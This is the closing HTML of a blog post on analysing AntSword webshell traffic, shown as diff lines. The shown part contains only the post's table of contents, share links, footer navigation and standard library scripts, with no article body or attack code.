+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#webshell%E7%90%86%E8%A7%A3"><span class="toc-number">1.</span> <span class="toc-text">webshell理解</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%9A%81%E5%89%91%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">蚁剑流量分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9C%A8wireshark%E6%8A%93%E5%88%B0%E6%95%B0%E6%8D%AE%E5%8C%85%EF%BC%9A"><span class="toc-number">2.1.</span> <span class="toc-text">在wireshark抓到数据包：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%BD%E8%B8%AAHTTP%E6%B5%81%E9%87%8F%EF%BC%9A"><span class="toc-number">2.2.</span> <span class="toc-text">追踪HTTP流量：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%B9%E5%8F%91%E9%80%81%E7%9A%84%E6%95%B0%E6%8D%AE%E8%BF%9B%E8%A1%8C%E8%BF%98%E5%8E%9F"><span class="toc-number">2.3.</span> <span class="toc-text">对发送的数据进行还原</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E6%88%98"><span class="toc-number">2.4.</span> <span class="toc-text">实战</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%94%E5%9B%9E%E6%95%B0%E6%8D%AE%E8%A7%A3%E5%AF%86"><span class="toc-number">2.5.</span> <span class="toc-text">返回数据解密</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">2.6.</span> <span class="toc-text">总结</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://polosec.github.io/2020/04/30/%E8%9A%81%E5%89%91%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-webshell/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://polosec.github.io/2020/04/30/%E8%9A%81%E5%89%91%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-webshell/&text=蚁剑流量分析&amp;webshell"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://polosec.github.io/2020/04/30/%E8%9A%81%E5%89%91%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-webshell/&title=蚁剑流量分析&amp;webshell"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://polosec.github.io/2020/04/30/%E8%9A%81%E5%89%91%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-webshell/&is_video=false&description=蚁剑流量分析&amp;webshell"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=蚁剑流量分析&amp;webshell&body=Check out this article: https://polosec.github.io/2020/04/30/%E8%9A%81%E5%89%91%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-webshell/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://polosec.github.io/2020/04/30/%E8%9A%81%E5%89%91%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-webshell/&title=蚁剑流量分析&amp;webshell"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://polosec.github.io/2020/04/30/%E8%9A%81%E5%89%91%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-webshell/&title=蚁剑流量分析&amp;webshell"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://polosec.github.io/2020/04/30/%E8%9A%81%E5%89%91%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-webshell/&title=蚁剑流量分析&amp;webshell"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://polosec.github.io/2020/04/30/%E8%9A%81%E5%89%91%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-webshell/&title=蚁剑流量分析&amp;webshell"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://polosec.github.io/2020/04/30/%E8%9A%81%E5%89%91%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-webshell/&name=蚁剑流量分析&amp;webshell&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://polosec.github.io/2020/04/30/%E8%9A%81%E5%89%91%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-webshell/&t=蚁剑流量分析&amp;webshell"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2021
+    Polo
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
